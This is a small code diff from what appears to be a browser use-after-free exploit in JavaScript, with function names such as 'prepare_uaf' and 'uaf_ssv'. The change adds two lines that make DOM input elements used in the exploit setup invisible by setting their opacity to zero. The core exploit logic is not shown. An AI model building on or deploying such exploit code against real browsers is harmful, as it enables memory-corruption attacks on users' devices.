@@ -195,8 +195,10 @@ function prepare_uaf() {
 async function uaf_ssv(fsets, index, index2) {
     const views = [];
     const input = document.createElement('input');
+	input.style.opacity = "0";
     input.id = 'input';
     const foo = document.createElement('input');
+	foo.style.opacity = "0";
     foo.id = 'foo';
     const bar = document.createElement('a');
     bar.id = 'bar';
